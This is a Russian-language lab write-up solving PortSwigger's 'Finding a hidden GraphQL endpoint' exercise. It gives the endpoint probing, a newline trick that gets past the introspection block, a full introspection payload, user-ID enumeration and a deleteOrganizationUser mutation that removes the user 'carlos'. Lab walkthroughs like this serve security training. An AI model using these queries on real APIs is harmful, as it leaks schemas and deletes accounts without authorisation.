Перейдем на уязвимый ресурс и попробуем залогиниться под случайным пользователем `user:passuser`

Далее перейдем в `Proxy` -> `HTTP history` и найдем данный запрос и отправим его в `Repeater`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/21.%20GraphQL%20API%20vulnerabilities/3.%20Finding%20a%20hidden%20GraphQL%20endpoint/pics%20for%20walkthrough/1.png)

Далее, проверим common `endpoint`'ы, которые предлагают нам методологи бурповской академии. Я решил проверить ручками, и не запихивать в `intruder`, так как их тут мало
```
/graphql
/api
/api/graphql
/graphql/api
/graphql/graphql
```

И единственный, отличающийся от всех иных - `/api`
```
POST /api
```
На что выдает - `"Method Not Allowed"`
и в ответе видим, что доступны только `GET` запросы
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/21.%20GraphQL%20API%20vulnerabilities/3.%20Finding%20a%20hidden%20GraphQL%20endpoint/pics%20for%20walkthrough/2.png)

окей, пробуем повторить тот же запрос, только с методом `GET`
```
Get /api
```

и получим, что `"Query not present"`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/21.%20GraphQL%20API%20vulnerabilities/3.%20Finding%20a%20hidden%20GraphQL%20endpoint/pics%20for%20walkthrough/3.png)


Добавим заголовок из ответа `Content-Type: application/json` в тело запроса, а так же заменим параметры с CSRF токенами и логином паролей на
```
{
        "query": "query{__schema{queryType{name}}}"
}
```


и получим 200 респонс со следующим ответом
```
{
  "errors": [
    {
      "locations": [],
      "message": "GraphQL introspection is not allowed, but the query contained __schema or __type"
    }
  ]
}
```

Погуглим `introspection GraphQL`
и зайдем на официальную доку -` https://graphql.org/learn/introspection/`

в которой найдем следующие слова 
`We designed the type system, so we know what types are available, but if we didn’t, we can ask GraphQL, by querying the __schema field, always available on the root type of a Query. Let’s do so now, and ask what types are available`.

И возьмем данный запрос и применим у себя 
```
{
    __schema 
{
        types {
            name
        }
    }
}
```
`Важно`! После `__schema` и `{` должен быть перенос строки!

и получим бьольшой ответ какие методы в graphQL существуют и каким


Далее погуглим `GrapgQL injection` и найдем великолепные ссылки на `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection`
и нам будет необходим пункт `Enumerate Database Schema via Introspection` где найдем пэйлоад. Его то мы и скопипастим в качестве запроса

```
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}

query IntrospectionQuery 
{
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
```

`Важно`! После `__schema` и `{` должен быть перенос строки!

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/21.%20GraphQL%20API%20vulnerabilities/3.%20Finding%20a%20hidden%20GraphQL%20endpoint/pics%20for%20walkthrough/4.png)

И в ответ получим огромный `json`, который легче сохранить как `json` и потом открыть в расширении `InQL` (да, URL все равно надо)
```
https://0a0c00be03f94530816e02eb00af006c.web-security-academy.net/api
```

и увидим в `mutations` следующий запрос 
```
mutation {
    deleteOrganizationUser(input: DeleteOrganizationUserInput) {
        user {
            id
            username
        }
    }
}
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/21.%20GraphQL%20API%20vulnerabilities/3.%20Finding%20a%20hidden%20GraphQL%20endpoint/pics%20for%20walkthrough/5.png)


А в `queries`

```
query {
    getUser(id: Int!) {
        id
        username
    }
}
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/21.%20GraphQL%20API%20vulnerabilities/3.%20Finding%20a%20hidden%20GraphQL%20endpoint/pics%20for%20walkthrough/6.png)

Для начала, нам необходимо найти пользователя `carlos`

Методом нехитрого и довольно быстрого перебора находим, что у него `id = 3`
```
query {
    getUser(id: 3) {
        id
        username
    }
}
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/21.%20GraphQL%20API%20vulnerabilities/3.%20Finding%20a%20hidden%20GraphQL%20endpoint/pics%20for%20walkthrough/7.png)
Далее удалим пользователя с `id :3`
```
mutation {
    deleteOrganizationUser(input: { id: 3 }) {
        user {
            id
        }
    }
}
```
и получим уведомление об успешно выполненной лабораторной работе

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/21.%20GraphQL%20API%20vulnerabilities/3.%20Finding%20a%20hidden%20GraphQL%20endpoint/pics%20for%20walkthrough/8.png)
